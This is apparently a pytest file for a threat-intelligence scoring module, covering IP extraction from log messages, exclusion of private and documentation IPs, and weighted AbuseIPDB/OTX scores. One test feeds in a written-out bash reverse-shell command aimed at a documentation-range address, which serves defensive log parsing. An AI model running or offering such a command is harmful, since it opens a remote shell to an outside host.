from app.threat_intel.scoring import (
    compute_combined_score,
    extract_ip_from_message,
    is_enrichable_ip,
)


def test_extract_ip_from_reverse_shell_message():
    msg = "bash -i >&/dev/tcp/203.0.113.5/4444 0>&1"
    assert extract_ip_from_message(msg) == "203.0.113.5"


def test_extract_ip_returns_none_when_absent():
    assert extract_ip_from_message("routine backup completed") is None


def test_private_ip_not_enrichable():
    assert is_enrichable_ip("10.0.0.5") is False
    assert is_enrichable_ip("192.168.1.1") is False


def test_documentation_range_not_enrichable():
    # RFC 5737 TEST-NET ranges — exactly what this project's own demo data uses
    assert is_enrichable_ip("198.51.100.7") is False
    assert is_enrichable_ip("203.0.113.5") is False


def test_loopback_not_enrichable():
    assert is_enrichable_ip("127.0.0.1") is False


def test_invalid_ip_not_enrichable():
    assert is_enrichable_ip("not-an-ip") is False


def test_public_ip_is_enrichable():
    assert is_enrichable_ip("118.25.6.39") is True


def test_combined_score_no_data_is_zero():
    assert compute_combined_score(None, None) == 0


def test_combined_score_high_abuseipdb_only():
    abuseipdb_data = {"abuseConfidenceScore": 100}
    assert compute_combined_score(abuseipdb_data, None) == 60  # 0.6 * 100


def test_combined_score_high_otx_pulse_count_only():
    otx_data = {"pulse_info": {"count": 10}}
    assert compute_combined_score(None, otx_data) == 36  # 0.4 * 90


def test_combined_score_both_high():
    abuseipdb_data = {"abuseConfidenceScore": 100}
    otx_data = {"pulse_info": {"count": 10}}
    assert compute_combined_score(abuseipdb_data, otx_data) == 96  # 60 + 36


def test_combined_score_zero_pulse_count_scores_zero():
    otx_data = {"pulse_info": {"count": 0}}
    assert compute_combined_score(None, otx_data) == 0
